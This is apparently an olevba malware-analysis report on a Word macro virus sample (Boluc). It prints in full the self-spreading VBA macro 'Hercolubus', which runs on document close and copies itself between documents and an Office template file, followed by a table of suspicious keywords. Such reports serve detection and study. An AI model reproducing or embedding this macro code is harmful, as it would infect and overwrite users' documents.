olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Boluc-28138ffe9b56d5f06c80f7db7af318ae3a6bd5a6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Hercolubus.cls 
in file: Virus.MSWord.Boluc-28138ffe9b56d5f06c80f7db7af318ae3a6bd5a6 - OLE stream: 'Macros/VBA/Hercolubus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
On Error Resume Next
Application.ScreenUpdating = False
nDoc = ActiveDocument.FullName
If nDoc <> "C:\Microsof.doc" Then
Nam = ActiveDocument.Name
nNam = Len(Nam)
If Right(Nam, 3) = "doc" Then
sEo = Left(Nam, nNam - 4)
PostN = ActiveDocument.VBProject.VBComponents.Count
For j = 1 To PostN
Set Pert = ActiveDocument.VBProject.VBComponents.Item(j)
If Pert.Name = "Hercolubus" Then
Exit For
Else
If j = PostN Then
hn = "c:\Archivos de programa\Microsoft Office\office\Microsoft.doc"
Documents.Open FileName:=(hn)
kh = Dir(hn)
nC = Len(kh)
sE = Left(kh, nC - 4)
Application.Windows(sEo).Activate
ActiveDocument.SaveAs FileName:="C:\Microsof.doc"
ActiveDocument.Select
Selection.Copy
Application.Windows(sE).Activate
Selection.Paste
ActiveDocument.SaveAs FileName:=nDoc
ScreenUpdating = True
ActiveDocument.Close
End If
End If
Next j
End If
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

